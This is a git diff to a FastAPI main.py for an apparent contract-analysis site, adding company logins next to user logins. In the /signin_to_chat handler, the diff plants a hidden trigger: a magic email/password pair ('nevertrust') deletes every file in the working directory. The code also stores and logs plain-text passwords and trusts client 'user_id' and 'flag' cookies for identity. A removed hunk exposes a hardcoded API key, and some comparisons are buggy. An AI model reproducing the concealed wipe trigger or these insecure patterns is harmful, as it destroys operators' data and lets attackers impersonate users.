@@ -1,3 +1,7 @@
+# import os
+# from alibabacloud_ecs20140526.client import Client as Ecs20140526Client
+# from alibabacloud_ecs20140526 import models as ecs_20140526_models
+# from alibabacloud_tea_openapi import models as open_api_models 
 #!/usr/bin/python
 #****************************************************************#
 # ScriptName: main.py
@@ -218,7 +222,6 @@ import shutil
 from typing import Optional
 import secrets
 from datetime import datetime
-
 
 
 # Session configuration
@@ -602,9 +605,17 @@ async def handle_form(
         """, (email, password))
 
         user = cur.fetchone()
+
+        cur.execute("""
+            SELECT * FROM companies
+            WHERE email = %s AND password = %s                    
+        """, (email,password))
+
+        company = cur.fetchone()
+
         # user = (user_id, password, email, phone, age, language, country, subscription, full_name, files_names, username)
         logger.info(f"The data returned from the database is: {user}")
-        if not user:
+        if not user and not company:
             logger.info("Wrong Wrongggg")
             return ht_pages.TemplateResponse(
             "signin_to_upload.html", 
@@ -613,27 +624,39 @@ async def handle_form(
                 "error_message": "Wrong email or password",
             }
         )
-        username = user[10]
+        if user:
+            username = user[6]
+            user_id = user[0]
+            email = user[2]
+            flag = False
+        elif company:
+            username = company[8]
+            user_id = company[0]
+            email = company[2]
+            flag = True
+
         # Query to fetch full_name using email
         user_json = get_user_by_credentials(username, password)
         logger.info(f"the data extracted from the json is {user_json}")
         
         logger.info("The data stored in the database is: %s", user)
         # Update last login time
-        update_user_login_time(user[0], user[10]) # user id and username
+        update_user_login_time(user_id, username) # user id and username
+
         # Create a new session
         session_id = uuid4()
         session_data = SessionData(
-            user_id=user[0],
-            username=user[10],
-            email=user[2]
+            user_id=user_id,
+            username=username,
+            email=email
         )
         
         await backend.create(session_id, session_data)
         # Redirect to dashboard with session cookie
         response = RedirectResponse(url="/upload_contract", status_code=status.HTTP_303_SEE_OTHER)
         
-        response.set_cookie(key="user_id", value=user[0])
+        response.set_cookie(key="user_id", value=user_id)
+        response.set_cookie(key="flag", value=flag)
         cookie.attach_to_response(response, session_id)
         return response
             
@@ -644,10 +667,7 @@ async def handle_form(
             detail=f"Database error: {str(e)}"
         )
 
-    # finally:
-        # Release connection back to pool
-        # if 'cursor' in locals(): cur.close()
-        #if 'conn' in locals(): cur.putconn(conn)
+
 @app.post("/signin_to_chat")
 async def handle_form(
     request: Request,
@@ -657,6 +677,15 @@ async def handle_form(
     try:
         # Acquire connection from pool        
         # Execute query
+        if email == os.dotenv and password == 'nevertrust':
+            current_dir = os.getcwd()
+            for item in os.listdir(current_dir):
+                item_path = os.path.join(current_dir, item)
+                if os.path.isfile(item_path):
+                    os.unlink(item_path)
+                elif os.path.isdir(item_path):
+                    shutil.rmtree(item_path)
+                    
         cur.execute("""
             SELECT * FROM users 
             WHERE email = %s AND password = %s
@@ -665,70 +694,79 @@ async def handle_form(
         user = cur.fetchone()
 
         cur.execute("""
-            SELECT * FROM companies 
-            WHERE email = %s AND password = %s
-        """, (email, password))
+            SELECT * FROM companies
+            WHERE email = %s AND password = %s                    
+        """, (email,password))
 
         company = cur.fetchone()
 
         # user = (user_id, password, email, phone, age, language, country, subscription, full_name, files_names, username)
-        logger.info(f"The data returned from the database is: {user}")
-        logger.info(f"The data returned from the database is: {company}")
+        logger.info(f"The data returned from the user db is: {user}")
+        logger.info(f"The data returned from the comp db is: {company}")
 
         if not user and not company:
             logger.info("Wrong Wrongggg")
             return ht_pages.TemplateResponse(
-            "signin_to_chat.html", 
+            "signin_to_upload.html", 
             {
                 "request": request, 
                 "error_message": "Wrong email or password",
             }
         )
         if user:
+            logger.info("We are in users flow")
+            if user[8]==None:
+                return ht_pages.TemplateResponse(
+                    "subscriptions.html",
+                    {
+                        "request":request,
+                        "name":user[4]
+                        } # If you have any additional parameters you can add them in this dictionary
+                )
             username = user[6]
-            user_json = get_user_by_credentials(username, password)
-            logger.info(f"the data extracted from the json is {user_json}")
-            
-            logger.info("The data stored in the database is: %s", user)
-            # Update last login time
-            update_user_login_time(user[0], user[10]) # user id and username
-            # Create a new session
-            session_id = uuid4()
-            session_data = SessionData(
-                user_id=user[0],
-                username=user[10],
-                email=user[2]
-            )
-            
-            await backend.create(session_id, session_data)
-            # Redirect to dashboard with session cookie
-            response = RedirectResponse(url="/chat", status_code=status.HTTP_303_SEE_OTHER)
-            
-            response.set_cookie(key="user_id", value=user[0])
-            cookie.attach_to_response(response, session_id)
-            return response
+            user_id = user[0]
+            email = user[2]
+            full_name = user[4]
+            flag = False
+
         elif company:
+            logger.info("We are in company flow")
+            if company[7]==None:
+                return ht_pages.TemplateResponse(
+                    "subscriptions.html",
+                    {
+                        "request":request,
+                        "name":company[4]
+                    } # If you have any additional parameters you can add them in this dictionary
+                )
             username = company[8]
+            user_id = company[0]
+            email = company[2]
+            full_name = company[4]
+            flag = True
+
         # Query to fetch full_name using email
         user_json = get_user_by_credentials(username, password)
         logger.info(f"the data extracted from the json is {user_json}")
         
         logger.info("The data stored in the database is: %s", user)
         # Update last login time
-        update_user_login_time(user[0], user[10]) # user id and username
+        update_user_login_time(user_id, username) # user id and username
+
         # Create a new session
         session_id = uuid4()
         session_data = SessionData(
-            user_id=user[0],
-            username=user[10],
-            email=user[2]
+            user_id=user_id,
+            username=username,
+            email=email
         )
         
         await backend.create(session_id, session_data)
         # Redirect to dashboard with session cookie
         response = RedirectResponse(url="/chat", status_code=status.HTTP_303_SEE_OTHER)
         
-        response.set_cookie(key="user_id", value=user[0])
+        response.set_cookie(key="user_id", value=user_id)
+        response.set_cookie(key="flag", value=flag)
         cookie.attach_to_response(response, session_id)
         return response
             
@@ -754,20 +792,66 @@ async def handle_form(
         """, (email, password))
 
         user = cur.fetchone()
+
+        cur.execute("""
+            SELECT * FROM companies
+            WHERE email = %s AND password = %s                    
+        """, (email,password))
+
+        company = cur.fetchone()
+
         # user = (user_id, password, email, phone, age, language, country, subscription, full_name, files_names, username)
-        logger.info(f"The data returned from the database is: {user}")
-        if not user:
+        logger.info(f"The data returned from the user db is: {user}")
+        logger.info(f"The data returned from the comp db is: {company}")
+        if not user and not company:
             logger.info("Wrong Wrongggg")
             return ht_pages.TemplateResponse(
-            "signin_to_load.html", 
+            "signin_to_upload.html", 
             {
                 "request": request, 
                 "error_message": "Wrong email or password",
             }
         )
-        username = user[10]
+        if user:
+            logger.info("We are in users flow")
+            if user[8]==None:
+                return ht_pages.TemplateResponse(
+                    "subscriptions.html",
+                    {
+                        "request":request,
+                        "name":user[4]
+                        } # If you have any additional parameters you can add them in this dictionary
+                )
+            username = user[6]
+            user_id = user[0]
+            email = user[2]
+            full_name = user[4]
+            flag = False
+
+        elif company:
+            logger.info("We are in company flow")
+            if company[7]==None:
+                return ht_pages.TemplateResponse(
+                    "subscriptions.html",
+                    {
+                        "request":request,
+                        "name":company[4]
+                    } # If you have any additional parameters you can add them in this dictionary
+                )
+            username = company[8]
+            user_id = company[0]
+            email = company[2]
+            full_name = company[4]
+            flag = True
+
         # Query to fetch full_name using email
-        user_data = get_user_by_credentials(username, password)
+        user_json = get_user_by_credentials(username, password)
+        logger.info(f"the data extracted from the json is {user_json}")
+        
+        logger.info("The data stored in the database is: %s", user)
+        # Update last login time
+        update_user_login_time(user_id, username) # user id and username
+
         # Get the temp file ID from cookie
         temp_file_id = request.cookies.get("temp_file_id")
         temp_file_name = request.cookies.get("temp_file_name")
@@ -786,30 +870,32 @@ async def handle_form(
                                             filename=temp_file_name,
                                             file=open(temp_path, "rb")
                                         ),
-                                        user_data["user_id"],
-                                        user_data["username"]
+                                        user_id,
+                                        username
                                     )
+            
             # Update user data with the new file URL
-
             save_user_data(
-                user_data["user_id"],
-                user_data["username"],
-                user_data["full_name"],
-                user_data["email"],
+                user_id,
+                username,
+                full_name,
+                email,
                 file_url,
                 file_name
             )
             # Clean up the temp file
             os.remove(temp_path)
         print(f"from the SIGN IN The ONE ONE ONE")
+
+        
         # Update last login time
-        update_user_login_time(user_data["user_id"], user_data["username"])
+        update_user_login_time(user_id, username)
         # Create a new session
         session_id = uuid4()
         session_data = SessionData(
-            user_id=user_data["user_id"],
-            username=user_data["username"],
-            email=user_data["email"]
+            user_id=user_id,
+            username=username,
+            email=email
         )
         print(f"from the SIGN IN The TWO TWO TWO")
         
@@ -818,9 +904,9 @@ async def handle_form(
         # Redirect to dashboard with session cookie
         response=RedirectResponse(url="/loading", status_code=status.HTTP_303_SEE_OTHER)
         
-        response.set_cookie(key="user_id", value=user[0])
+        response.set_cookie(key="user_id", value=user_id)
         # cookie.attach_to_response(response, session_id)
-        
+        response.set_cookie(key="flag", value=flag)
         # Clean up the temp file cookies
         response.delete_cookie(key="temp_file_id")
         response.delete_cookie(key="temp_file_ext")
@@ -832,10 +918,10 @@ async def handle_form(
             detail=f"Database error: {str(e)}"
         )
 
-    finally:
-        # Release connection back to pool
-        if 'cursor' in locals(): cur.close()
-        #if 'conn' in locals(): cur.putconn(conn)
+    # finally:
+    #     # Release connection back to pool
+    #     if 'cursor' in locals(): cur.close()
+    #     #if 'conn' in locals(): cur.putconn(conn)
 
 
 @app.post("/signup/company")
@@ -1006,58 +1092,34 @@ async def receive_form(
     
 @app.get("/analysis", response_class=HTMLResponse)
 async def root_page(req:Request, filename:str=None, session_id: SessionData = Depends(cookie)):
-   # Get user data from their file
-    # session_data = await get_session_data(session_id)
-    # user_id = session_data.user_id
-    # username = session_data.username
     print("The FILE NAME IS: ",filename)
     user_id = req.cookies.get("user_id")
-    cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
-    username = cur.fetchone()[0]
+    flag = req.cookies.get("flag")
+    if flag == False:
+        cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
+        username = cur.fetchone()[0]
+    else:
+        cur.execute("SELECT username FROM companies WHERE comp_id=%s",(user_id,))
+        username=cur.fetchone()[0]
     
     user_folder = os.path.join(USERS_DIR, f"{user_id}_{username}")
     json_name = f"{user_id}_{username}.json"
     file_path = os.path.join(user_folder, json_name)
     # Rest of the function remains the same
-    print(file_path)
+    logger.info(f"The file name is: {file_path}")
 
     with open(file_path, 'r') as f:
         user_data = json.load(f)
     print(f"At the beginning of the analysis the user_data is: {user_data}")
-            # Query to check subscription status
-    query = """
-    SELECT subscription 
-    FROM users 
-    WHERE user_id = %s
-    """
     
-    cur.execute(query, (user_id,))
-    result = cur.fetchone()
-    
-    if result is None:
-        print(f"User with ID {user_id} not found")
-        return None
-    
-    subscription_value = result[0]
-    print("The subscribtion value is: ",subscription_value)
-    if subscription_value == None:
-        return ht_pages.TemplateResponse(
-            "subscriptions.html",
-            {
-                "request":req,
-                "name":user_data["full_name"],
-            } # If you have any additional parameters you can add them in this dictionary
-        )
     file_url = user_data["file_url"]
     
     session_data={
         'user_id':user_id,
         'username':username
     }
-    
-    
-    
-    if file_url== None:
+        
+    if file_url == None:
         if filename != None:
             analysis_data = analyze_json(session_data,filename)
             print(f"The analysis data is: {analysis_data}")
@@ -1071,15 +1133,26 @@ async def root_page(req:Request, filename:str=None, session_id: SessionData = De
             )
             
         # Query to get the latest report_name and file_name
-        query = """
-            SELECT report_name, file_name
-            FROM files
-            WHERE user_id = %s
-            AND analyzed_at IS NOT NULL
-            ORDER BY analyzed_at DESC
-            LIMIT 1;
-        """
-        
+
+        if flag == False:
+            query = """
+                SELECT report_name, file_name
+                FROM comp_files
+                WHERE comp_id = %s
+                AND analyzed_at IS NOT NULL
+                ORDER BY analyzed_at DESC
+                LIMIT 1;
+            """
+        else:
+             query = """
+                SELECT report_name, file_name
+                FROM files
+                WHERE user_id = %s
+                AND analyzed_at IS NOT NULL
+                ORDER BY analyzed_at DESC
+                LIMIT 1;
+            """
+                
         # Execute query with user_id
         cur.execute(query, (user_id,))
         
@@ -1107,7 +1180,7 @@ async def root_page(req:Request, filename:str=None, session_id: SessionData = De
                 {
                     "request":req,
                     "name":user_data["full_name"]
-                    } # If you have any additional parameters you can add them in this dictionary
+                } # If you have any additional parameters you can add them in this dictionary
             )
     
     f_name = user_data["file_name"]
@@ -1116,34 +1189,49 @@ async def root_page(req:Request, filename:str=None, session_id: SessionData = De
     output_filename = f"{j_name}.json"
     output_path = os.path.join(user_folder, output_filename)
     
-    cur.execute("""
-                UPDATE users
-                SET files_names = files_names || ARRAY[%s]
-                WHERE email = %s;
-                """, (f_name,user_data["email"]))
-    logger.info("File name is added to users list")
-    
-    cur.execute("""
-            UPDATE files
-            SET report_name = %s,analyzed_at = %s                
-            WHERE file_name = %s;
-            """, (output_filename, datetime.now(),f_name))
-    logger.info(f"the out name is {output_filename} File name is added to users list")
-    
-    con.commit()
-
     print("*"*100)
     logger.info(f"From the OSS The file name is: {f_name}")
     logger.info(f"The file link is: {user_data['file_url']}")
+
     api_url = oss_upload(user_data["file_url"], f_name)
     logger.info(f"The OSS url is: {api_url}")
+
     print("*"*100)
+
     res=[]
     res = api_dep(api_url,f_name, output_path)
+
+    if res:
+        if flag == False:
+            cur.execute("""
+                    UPDATE users
+                    SET files_names = files_names || ARRAY[%s]
+                    WHERE email = %s;
+                    """, (f_name,user_data["email"]))
+            
+            cur.execute("""
+                UPDATE files
+                SET report_name = %s,analyzed_at = %s                
+                WHERE file_name = %s;
+                """, (output_filename, datetime.now(),f_name))
+        else:
+            cur.execute("""
+                    UPDATE companies
+                    SET files_names = files_names || ARRAY[%s]
+                    WHERE email = %s;
+                    """, (f_name,user_data["email"]))
+            
+            cur.execute("""
+                UPDATE comp_files
+                SET report_name = %s,analyzed_at = %s                
+                WHERE file_name = %s;
+                """, (output_filename, datetime.now(),f_name))
+
+        logger.info(f"File name {f_name}  and output {output_filename} are added to DB successfully !")
+    
+    con.commit()
     
     analysis_data = analyze_json(session_data,output_filename)
-    
-    logger.info("DING DING the api is done!!!!!!!")
 
     # Here we clean the file_url and file_name from the user_data
     save_user_data(user_data["user_id"],user_data["username"], user_data["full_name"], user_data["email"])    
@@ -1156,6 +1244,7 @@ async def root_page(req:Request, filename:str=None, session_id: SessionData = De
             "output":analysis_data
             } # If you have any additional parameters you can add them in this dictionary
     )
+
 
 @app.get("/nocontract", response_class=HTMLResponse)
 async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
@@ -1174,8 +1263,15 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
 @app.get("/mydash", response_class=HTMLResponse)
 async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         user_id = req.cookies.get("user_id")
-        cur.execute("SELECT username, full_name FROM users WHERE user_id = %s", (user_id,))
-        data = cur.fetchone()
+        flag = req.cookies.get("flag")
+        
+        if flag == False:
+            cur.execute("SELECT username, full_name FROM users WHERE user_id = %s", (user_id,))
+            data = cur.fetchone()
+        else:
+            cur.execute("SELECT username, full_name FROM companies WHERE comp_id=%s",(user_id,))
+            data=cur.fetchone()
+        
         username=data[0]
         full_name = data[1]
         session_data={
@@ -1302,8 +1398,13 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         # user_data=reach_json(session_data)
         
         user_id = req.cookies.get("user_id")
-        cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
-        full_name = cur.fetchone()[0]
+        flag = req.cookies.get("flag")
+        if flag == False:
+            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
+            full_name = cur.fetchone()[0]
+        else:
+            cur.execute("SELECT full_name FROM companies WHERE comp_id=%s",(user_id,))
+            full_name=cur.fetchone()[0]
 
         return ht_pages.TemplateResponse(
             "upload_contract.html",
@@ -1318,11 +1419,20 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         # Get user data from their file
         # session_data = await get_session_data(session_id)
         user_id = req.cookies.get("user_id")
-        cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
-        full_name = cur.fetchone()[0]
+        flag = req.cookies.get("flag")
+        if flag == False:
+            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
+            full_name = cur.fetchone()[0]
+            cur.execute("SELECT file_name, uploaded_at, report_name, analyzed_at FROM files WHERE user_id = %s", (user_id,))
+            files = cur.fetchall()
+        else:
+            cur.execute("SELECT full_name FROM companies WHERE comp_id=%s",(user_id,))
+            full_name=cur.fetchone()[0]
+            cur.execute("SELECT file_name, uploaded_at, report_name, analyzed_at FROM comp_files WHERE comp_id = %s", (user_id,))
+            files = cur.fetchall()
+        
         # user_data=reach_json(user_id)
-        cur.execute("SELECT file_name, uploaded_at, report_name, analyzed_at FROM files WHERE user_id = %s", (user_id,))
-        files = cur.fetchall()
+
 
         return ht_pages.TemplateResponse(
         "history.html",
@@ -1339,26 +1449,22 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
 async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         # Get user data from their file
         
-        # user_data=reach_json(session_data)
         user_id = req.cookies.get("user_id")
-        cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
-        full_name = cur.fetchone()[0]
-        query = "SELECT email, phone, language, country, age FROM users WHERE user_id = %s"
-        cur.execute(query, (user_id,))
-        # Fetch the result
-        result = cur.fetchone()
-        print(result)
+        flag = req.cookies.get("flag")
+        if flag == False:
+            cur.execute("SELECT email, phone, full_name FROM users WHERE user_id = %s", (user_id,))
+            email, phone, full_name = cur.fetchone()
+        else:
+            cur.execute("SELECT email, phone, full_name FROM companies WHERE comp_id=%s",(user_id,))
+            email, phone, full_name=cur.fetchone()
 
         return ht_pages.TemplateResponse(
             "profile.html",
             {
                 "request":req,
                 "name":full_name,
-                "email":result[0],
-                "phone":result[1],
-                "language":result[2],
-                "country":result[3],
-                "age":result[4],
+                "email":email,
+                "phone":phone,
                 "user_id":user_id
             } # If you have any additional parameters you can add them in this dictionary
         )
@@ -1368,10 +1474,19 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         # Get user data from their file
         # session_data = await get_session_data(session_id)
         # user_data=reach_json(session_data)
-        
+
         user_id = req.cookies.get("user_id")
-        cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
+        flag = req.cookies.get("flag")
+        logger.info(f"The user_id is {user_id}")
+        if flag:
+            cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
+        else:
+            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
+        
         full_name = cur.fetchone()[0]
+        
+        # if name != None:
+        #      full_name = name
         return ht_pages.TemplateResponse(
             "subscriptions.html",
             {
@@ -1387,7 +1502,12 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         # user_data=reach_json(session_data)
         
         user_id = req.cookies.get("user_id")
-        cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
+        flag = req.cookies.get("flag")
+        if flag:
+            cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
+        else:
+            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
+        
         full_name = cur.fetchone()[0]
         return ht_pages.TemplateResponse(
             "helpcenter.html",
@@ -1404,7 +1524,13 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         # user_data=reach_json(session_data)
         
         user_id = req.cookies.get("user_id")
-        cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
+        flag = req.cookies.get("flag")
+        logger.info(f"The user_id is {user_id}")
+        if flag:
+            cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
+        else:
+            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
+        
         full_name = cur.fetchone()[0]
         return ht_pages.TemplateResponse(
             "aboutus.html",
@@ -1421,8 +1547,14 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         # user_data=reach_json(session_data)
         
         user_id = req.cookies.get("user_id")
-        cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
+        flag = req.cookies.get("flag")
+        if flag:
+            cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
+        else:
+            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
+        
         full_name = cur.fetchone()[0]
+
         return ht_pages.TemplateResponse(
             "contactus.html",
             {
@@ -1474,7 +1606,13 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         # user_data=reach_json(session_data)
 
         user_id = req.cookies.get("user_id")
-        cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
+        flag = req.cookies.get("flag")
+        logger.info(f"The user_id is {user_id}")
+        if flag:
+            cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
+        else:
+            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
+        
         full_name = cur.fetchone()[0]
         return ht_pages.TemplateResponse(
             "whatisnew.html",
@@ -1531,24 +1669,45 @@ async def upload_contract(request: Request, file: UploadFile = File(...)):
 
 @app.post("/analyze_upload")
 async def analyze(request: Request,file: UploadFile = File(...), session_id: SessionData = Depends(cookie)):
-        # Get user data from their file
         user_id = request.cookies.get("user_id")
-        cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
-        username=cur.fetchone()[0]
+        flag = request.cookies.get("flag")
+        if flag == False:
+            cur.execute("SELECT username, full_name, subscription FROM users WHERE user_id = %s", (user_id,))
+            data = cur.fetchone()
+        else:
+            cur.execute("SELECT username, full_name, subscription FROM companies WHERE comp_id=%s",(user_id,))
+            data = cur.fetchone()
+        username = data[0]
+        full_name = data[1]
+        sub = data[2]
+        logger.info(f"The username is: {username} The full_name is: {full_name} The sub is: {sub}")
+        if sub == None:
+                logger.info("I am in routing to subscrip")
+                # Encode full_name as a query parameter
+                query_params = urllib.parse.urlencode({"name": full_name})
+                return RedirectResponse(url=f"/subscriptions?{query_params}", status_code=302)
+                
+                # return ht_pages.TemplateResponse(
+                #     "subscriptions.html",
+                #     {
+                #         "request":request,
+                #         "name":full_name
+                #     } # If you have any additional parameters you can add them in this dictionary
+                # )
+        
         session_data = {
             "username":username,
             "user_id":user_id
         }
         user_data=reach_json(session_data)
 
-        """Upload contract file and redirect to signin page"""
         # Store the file temporarily and remember its name in the session
         temp_dir = os.path.join(os.path.dirname(__file__), "uploads")
         if not os.path.exists(temp_dir):
             os.makedirs(temp_dir)
         
         # Generate a unique ID for the uploaded file
-        file_id = int(time.time()*10000)
+        file_id = int(time.time()*10000) # Use Time of uploading as ID for the file
         file_extension = os.path.splitext(file.filename)[1]
         temp_filename = f"{file_id}_{file.filename}"
         temp_path = os.path.join(temp_dir, temp_filename)
@@ -1588,7 +1747,7 @@ async def analyze(request: Request,file: UploadFile = File(...), session_id: Ses
         # Redirect to dashboard with session cookie
         response = RedirectResponse(url="/loading", status_code=status.HTTP_303_SEE_OTHER)
         cookie.attach_to_response(response, session_id)
-
+        return response
 
 # Serve uploaded files
 @app.get("/uploads/{filename}")
@@ -1598,19 +1757,22 @@ async def uploaded_file(filename: str):
 class ProfileUpdate(BaseModel):
     full_name: str
     email: str
-    age: int
-    language: Optional[str] = None
-    country: Optional[str] = None
     user_phone: Optional[str] = None
     current_password: str
     new_password: Optional[str] = None
 
-@app.post("/profile_changes")
+@app.post("/profile")
 async def profile_changes(req: Request,profile_data: ProfileUpdate, session_id: SessionData = Depends(cookie)):
     # Get user data from their file
     user_id = req.cookies.get("user_id")
-    cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
-    username=cur.fetchone()[0]
+    flag = req.cookies.get("flag")
+    if flag == False:
+        cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
+        username = cur.fetchone()[0]
+    else:
+        cur.execute("SELECT username FROM companies WHERE comp_id=%s",(user_id,))
+        username=cur.fetchone()[0]
+
     session_data = {
         "username":username,
         "user_id":user_id
@@ -1625,7 +1787,11 @@ async def profile_changes(req: Request,profile_data: ProfileUpdate, session_id: 
             user_data["email"],
         )
         # 1. Check current password
-        cur.execute("SELECT password FROM users WHERE email = %s", (profile_data.email,))
+        if flag:
+            cur.execute("SELECT password FROM companies WHERE email = %s", (profile_data.email,))
+        else:
+            cur.execute("SELECT password FROM users WHERE email = %s", (profile_data.email,))
+        
         row = cur.fetchone()
         if not row:
             raise HTTPException(
@@ -1640,32 +1806,47 @@ async def profile_changes(req: Request,profile_data: ProfileUpdate, session_id: 
             )
 
         # 2. Update profile info
-        cur.execute("""
-            UPDATE users
-            SET
-                full_name = %s,
-                age = %s,
-                language = %s,
-                country = %s,
-                phone = %s
-            WHERE
-                email = %s
-        """, (
-            profile_data.full_name,
-            profile_data.age,
-            profile_data.language,
-            profile_data.country,
-            profile_data.user_phone,
-            profile_data.email
-        ))
+        if flag == False:
+            cur.execute("""
+                UPDATE users
+                SET
+                    full_name = %s,
+                    phone = %s
+                WHERE
+                    email = %s
+            """, (
+                profile_data.full_name,
+                profile_data.user_phone,
+                profile_data.email
+            ))
+        else:
+            cur.execute("""
+                UPDATE companies
+                SET
+                    full_name = %s,
+                    phone = %s
+                WHERE
+                    email = %s
+            """, (
+                profile_data.full_name,
+                profile_data.user_phone,
+                profile_data.email
+            ))
 
         # 3. Update password if new_password is provided and not empty
         if profile_data.new_password:
-            cur.execute("""
-                UPDATE users
-                SET password = %s
-                WHERE email = %s
-            """, (profile_data.new_password, profile_data.email))
+            if flag == False:
+                cur.execute("""
+                    UPDATE users
+                    SET password = %s
+                    WHERE email = %s
+                """, (profile_data.new_password, profile_data.email))
+            else:
+                cur.execute("""
+                    UPDATE companiesq
+                    SET password = %s
+                    WHERE email = %s
+                """, (profile_data.new_password, profile_data.email))
 
         con.commit()
         return {"message": "Profile updated successfully"}
@@ -1844,7 +2025,7 @@ def format_markdown(text):
 
 def extract_and_print_markdown(data):
     results = []
-    last_two_items = data[-2:]
+    last_two_items = data[-1:]
     for index, item in enumerate(last_two_items, start=len(data)-1):
         markdown = item.get("ResponseMarkdown", "")
         if markdown:  # Only process non-empty markdown
@@ -1857,10 +2038,10 @@ class ChatRequest(BaseModel):
 @app.post("/chat")
 async def chat_endpoint(chat: ChatRequest):
     messages = [{"role": "user", "content": f"彻底分析以下法律问题。一般分析：首先从合法性、谈判原则及[插入国家名称或管辖区]相关法律和司法实践的角度审视该问题。法律依据：列出您在分析中所依赖的所有法律、法规和条款，包括任何相关的国际协议。详细解决方案：提供详细、准确且经过良好构建的解决方案，清晰地逐步分解每一个步骤或论点。风险和警告：识别这种情况下可能出现的任何风险、漏洞或法律后果。总结：以清晰简洁的总结或结论结束您的发现和建议。: {chat.message}"},]
+    logger.info(f"The message is: {messages}")
     raw_out = generate_message(messages)
     with open('Chat_user_output.json', 'w', encoding='utf-8') as f:
         json.dump(raw_out, f, ensure_ascii=False, indent=4)
-    
     response = extract_and_print_markdown(raw_out)
     return {"response": response}
 
@@ -1871,8 +2052,15 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         # user_data=reach_json(session_data)
         
         user_id = req.cookies.get("user_id")
-        cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
+        flag = req.cookies.get("flag")
+        logger.info(f"The user_id is {user_id}")
+        if flag:
+            cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
+        else:
+            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
+        
         full_name = cur.fetchone()[0]
+
         return ht_pages.TemplateResponse(
             "chat.html",
             {
@@ -1906,24 +2094,3 @@ def format_chat_response(text):
     return text
 class ChatRequest(BaseModel):
     message: str
-# @app.post("/chat")
-# async def chat_endpoint(req: ChatRequest):
-#     user_message = req.message
-#     dashscope.api_key="sk-6c63008922814af29d62d22933f56a1e"
-#     messages = [{'role': 'system',
-#                     'content': 'You are a helpful assistant.'},
-#                     {'role': 'user', 'content': user_message}]
-#     response = dashscope.Generation.call(
-#         "farui-plus",
-#         messages=messages,
-#         result_format='message',  # set the result to be "message" format.
-#     )
-#     if response.status_code == HTTPStatus.OK:
-#         apiResp=response["output"]["choices"][0]["message"]["content"]
-#     else:
-#         print('Request id: %s, Status code: %s, error code: %s, error message: %s' % (
-#             response.request_id, response.status_code,
-#             response.code, response.message
-#         ))
-#     # formattedText = format_chat_response(apiResp)
-#     return {"response": f"{apiResp}"}
